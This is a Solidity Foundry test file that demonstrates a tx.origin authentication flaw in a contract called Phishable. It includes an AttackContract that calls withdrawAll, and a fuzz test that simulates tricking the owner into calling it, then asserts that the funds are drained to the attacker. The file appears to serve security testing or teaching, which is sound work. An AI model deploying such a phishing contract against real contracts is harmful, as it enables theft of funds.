
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Phishable} from "../src/Phishable.sol";

contract AttackContract {
    Phishable public target;
    address public attacker;

    constructor(Phishable _target, address _attacker) {
        target = _target;
        attacker = _attacker;
    }

    function attack() external {
        target.withdrawAll(payable(attacker));
    }
}

contract TestAccessControlPhishable is Test {
    Phishable public phishable;
    address public owner;

    function setUp() public {
        owner = makeAddr("owner");
        phishable = new Phishable(owner);
        vm.deal(address(phishable), 10 ether);
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        // --- 1. Constraints ---
        vm.assume(caller != address(this));
        vm.assume(caller != address(0));
        vm.assume(caller != address(vm));
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        
        // Exclude the owner since they are the only privileged role
        vm.assume(caller != owner);
        
        // Exclude the phishable contract itself
        vm.assume(caller != address(phishable));

        // --- 2. State Configuration ---
        uint256 initialBalance = address(phishable).balance;
        uint256 callerInitialBalance = caller.balance;

        // --- 3. Execution & Assertion ---
        
        // The vulnerability here is the use of tx.origin instead of msg.sender
        // An attacker can deploy a malicious contract and trick the owner into calling it
        // The malicious contract then calls withdrawAll, and tx.origin will be the owner
        
        // To demonstrate this, we simulate the owner being tricked into interacting
        // with an attacker's contract
        
        // Deploy attack contract as the arbitrary caller (attacker)
        vm.prank(caller);
        AttackContract attackContract = new AttackContract(phishable, caller);
        
        // The owner is tricked into calling the attack contract
        // This simulates a phishing attack where owner interacts with malicious contract
        vm.prank(owner, owner); // Sets both msg.sender and tx.origin to owner
        attackContract.attack();
        
        // Assert that the funds were stolen by the arbitrary caller
        assertEq(address(phishable).balance, 0, "Phishable contract should be drained");
        assertEq(caller.balance, callerInitialBalance + initialBalance, "Attacker should receive all funds");
    }
}
